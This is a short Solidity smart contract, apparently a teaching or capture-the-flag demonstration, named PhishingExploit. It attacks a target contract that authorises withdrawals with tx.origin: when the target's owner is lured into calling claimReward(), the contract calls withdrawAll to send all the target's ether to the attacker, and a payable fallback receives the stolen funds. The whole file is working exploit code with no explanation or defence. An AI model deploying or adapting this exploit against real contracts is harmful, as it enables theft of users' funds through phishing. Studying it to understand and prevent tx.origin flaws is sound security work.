pragma solidity ^0.4.22;

interface IPhishable {
    function withdrawAll(address _recipient) external;
}

contract PhishingExploit {
    address public attacker;
    address public phishableAddress;

    constructor(address _phishableAddress) public {
        attacker = msg.sender;
        phishableAddress = _phishableAddress;
    }

    // Phishing function that the owner of Phishable will unknowingly call
    function claimReward() public {
        // tx.origin == Phishable.owner at this point!
        IPhishable(phishableAddress).withdrawAll(attacker);
    }

    // Allow receiving stolen ether
    function () public payable {}
}

